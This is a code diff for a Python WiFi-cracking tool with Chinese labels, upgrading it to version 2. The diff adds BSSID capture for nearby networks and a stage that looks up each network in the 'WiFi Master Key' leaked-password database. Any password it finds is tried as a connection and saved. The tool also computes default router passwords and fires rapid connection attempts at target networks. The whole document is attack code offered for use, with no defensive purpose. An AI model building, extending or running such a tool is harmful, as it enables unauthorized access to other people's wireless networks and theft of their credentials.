@@ -280,6 +280,7 @@ def get_targets(interface="en0"):
                     continue
                 targets.append({
                     "ssid": ssid,
+                    "bssid": n.get("bssid", ""),
                     "rssi": n.get("rssi", -100),
                     "brand": strength["brand"],
                     "difficulty": strength["difficulty"],
@@ -319,6 +320,7 @@ def get_targets(interface="en0"):
                 continue
             targets.append({
                 "ssid": ssid,
+                "bssid": "",
                 "rssi": -60,
                 "brand": strength["brand"],
                 "difficulty": strength["difficulty"],
@@ -359,12 +361,35 @@ def save_cracked(ssid, password, source="lightning"):
 # ============================================================
 # 闪电破解主流程
 # ============================================================
+def _query_masterkey_for_target(ssid, bssid, interface="en0"):
+    """
+    查询WiFi万能钥匙密码库，如果查到密码则直接测试连接
+    返回: (是否成功, 密码) 或 (False, None)
+    """
+    if not bssid:
+        return False, None
+    try:
+        sys.path.insert(0, str(SCRIPT_DIR))
+        from wifi_db_query import query_wifi_masterkey
+        pwd = query_wifi_masterkey(ssid, bssid)
+        if pwd:
+            # 查到密码，直接测试连接
+            ok, _ = try_connect(ssid, pwd, interface)
+            if ok:
+                return True, pwd
+        return False, None
+    except ImportError:
+        return False, None
+    except Exception:
+        return False, None
+
+
 def lightning_crack(targets, interface="en0"):
     """
-    闪电破解：默认密码计算 + 零延迟扫射
+    闪电破解：万能钥匙预查 + 默认密码计算 + 零延迟扫射
     """
     total = len(targets)
-    results = {"default_pwd": [], "failed": []}
+    results = {"masterkey": [], "default_pwd": [], "failed": []}
     t_start = time.time()
 
     # 信号处理
@@ -376,28 +401,66 @@ def lightning_crack(targets, interface="en0"):
 
     print()
     print(f"{BOLD}{'=' * 60}")
-    print(f"  闪电WiFi破解器 v1.0")
-    print(f"  默认密码计算 | 零延迟扫射")
+    print(f"  闪电WiFi破解器 v2.0")
+    print(f"  万能钥匙预查 | 默认密码计算 | 零延迟扫射")
     print(f"{'=' * 60}{RESET}")
 
     # ============================================================
-    # 默认密码计算 + 零延迟扫射
+    # 阶段0: WiFi万能钥匙密码库预查询（秒级）
+    # ============================================================
+    has_bssid = any(t.get("bssid") for t in targets)
+    if has_bssid:
+        print(f"{BOLD}{MAGENTA}")
+        print(f"  ┌─────────────────────────────────────────────┐")
+        print(f"  │  阶段0: WiFi万能钥匙密码库查询（秒级）       │")
+        print(f"  └─────────────────────────────────────────────┘{RESET}")
+        print()
+
+        for idx, target in enumerate(targets):
+            if interrupted[0]:
+                break
+            ssid = target["ssid"]
+            bssid = target.get("bssid", "")
+            if not bssid:
+                continue
+
+            cracked = load_cracked()
+            if ssid in cracked:
+                continue
+
+            sys.stdout.write(f"\r  [{idx+1}/{total}] {ssid:<24} 查询万能钥匙...")
+            sys.stdout.flush()
+
+            ok, pwd = _query_masterkey_for_target(ssid, bssid, interface)
+            if ok:
+                save_cracked(ssid, pwd, "masterkey:万能钥匙密码库")
+                results["masterkey"].append((ssid, pwd, "万能钥匙密码库"))
+                print()
+                print(f"  {GREEN}{BOLD}>>> 万能钥匙命中！SSID: {ssid}  "
+                      f"密码: {pwd}{RESET}")
+            else:
+                sys.stdout.write(f"\r  [{idx+1}/{total}] {ssid:<24} 万能钥匙未收录\n")
+
+        print()
+
+    # ============================================================
+    # 阶段1: 默认密码计算 + 零延迟扫射
     # ============================================================
     print(f"{BOLD}{CYAN}")
     print(f"  ┌─────────────────────────────────────────────┐")
-    print(f"  │  默认密码计算 + 零延迟扫射                   │")
+    print(f"  │  阶段1: 默认密码计算 + 零延迟扫射            │")
     print(f"  │  每个目标仅试最可能的5-20条密码              │")
     print(f"  └─────────────────────────────────────────────┘{RESET}")
     print()
 
-    success_count = 0
+    success_count = len(results["masterkey"])
     for idx, target in enumerate(targets):
         if interrupted[0]:
             break
 
         ssid = target["ssid"]
 
-        # 跳过已破解的（可能是之前运行已破解）
+        # 跳过已破解的（包括万能钥匙阶段已命中的）
         cracked = load_cracked()
         if ssid in cracked:
             continue
@@ -459,7 +522,14 @@ def lightning_crack(targets, interface="en0"):
             print(f"    {ssid:<28} {pwd:<20} ({reason})")
         print()
 
-    total_hit = len(results["default_pwd"])
+    # 万能钥匙命中
+    if results["masterkey"]:
+        print(f"  {GREEN}{BOLD}[万能钥匙] 命中 {len(results['masterkey'])} 个:{RESET}")
+        for ssid, pwd, reason in results["masterkey"]:
+            print(f"    {ssid:<28} {pwd:<20} ({reason})")
+        print()
+
+    total_hit = len(results["default_pwd"]) + len(results["masterkey"])
     if total_hit > 0:
         print(f"  {GREEN}{BOLD}总命中: {total_hit} 个WiFi密码已获取！{RESET}")
         print(f"  密码已保存到: {CRACKED_FILE}")
